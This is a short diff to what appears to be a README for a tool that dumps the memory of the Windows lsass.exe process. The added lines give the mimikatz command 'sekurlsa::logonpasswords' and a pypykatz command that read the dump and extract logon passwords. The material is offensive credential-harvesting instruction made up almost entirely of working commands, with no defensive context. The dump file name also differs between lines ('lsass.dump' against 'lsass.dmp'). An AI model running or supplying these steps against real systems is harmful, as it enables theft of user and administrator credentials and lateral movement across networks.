@@ -11,3 +11,17 @@ Run MiniDump.exe with the PID of lsass.exe as the first argument.
 ```
 MiniDump.exe <PID>
 ```
+The dump file will be saved as lsass.dump in `C:\Windows\tasks\`.
+Then read the dump file with mimikatz and pypykatz and dump the passwords.
+
+From Windows
+
+```
+mimikatz.exe "sekurlsa::minidump C:\Windows\tasks\lsass.dmp" "sekurlsa::logonpasswords"
+```
+
+From Linux
+
+```
+pypykatz lsa minidump lsass.dmp
+```
